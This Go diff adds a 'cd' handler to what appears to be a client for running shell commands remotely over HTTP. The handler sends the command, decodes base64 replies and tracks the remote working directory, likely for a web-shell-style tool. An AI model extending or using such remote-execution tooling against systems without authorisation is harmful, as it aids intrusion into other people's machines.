@@ -117,3 +117,22 @@ func rawEnd(r *http.Response) {
 
 	fmt.Println(body)
 }
+
+func (cmd *COMMAND) Cd(a string) {
+	a = a + " && pwd"
+	cmd.createCMD(&a, "r")
+	a = a + cmd.getReturn()
+
+	network.NET.Send(a, cdEnd)
+}
+
+func cdEnd(r *http.Response) {
+	buffer := worker.GetBody(r)
+	base64 := string(buffer)
+	body := normalizer.Decode(base64)
+
+	line := strings.TrimSpace(body)
+	CMD._context = line
+
+	fmt.Println(body)
+}
